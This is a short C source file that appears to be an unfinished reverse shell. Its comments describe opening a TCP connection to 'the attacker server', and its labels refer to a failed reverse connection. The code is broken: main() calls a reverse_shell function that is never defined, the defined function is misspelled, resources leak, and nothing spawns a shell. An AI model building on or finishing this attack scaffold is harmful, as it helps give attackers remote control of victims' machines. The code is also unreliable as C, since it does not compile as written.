#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

// scanner

// socket
//
// connect
//
//
// recv/send


#define return_defer(label) goto label

// 22 "ssh"
//
// 



bool coonect_to_host(char *host,char *service)
{
	// open tcp connection to the attacker server
	
	int client_fd = socket(AF_INET,SOCK_STREAM,0);
	if (client_fd == -1)
	{
		return_defer(socket_failed);
	}

	struct addrinfo hints,*result;
	
	memset(&hints,0,sizeof(hints));	
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	int status = getaddrinfo(host,service,&hints,&result);
	
	if (status != 0)
	{
		return_defer(getaddrinfo_failed);
	}

	status = connect(client_fd,result->ai_addr,result->ai_addrlen);
	if (status == -1)
	{
		return_defer(connect_failed);
	}


	return true;


connect_failed:
	perror("connect : ");
	return_defer(reverse_failed);


getaddrinfo_failed:
	perror("getaddrinfo : ");
	return_defer(reverse_failed);

socket_failed:
	perror("socket : ");

reverse_failed:
	return false;
}


int main(int argc,char **argv)
{
	reverse_shell(argv[1],argv[2]);	

	return 0;
}
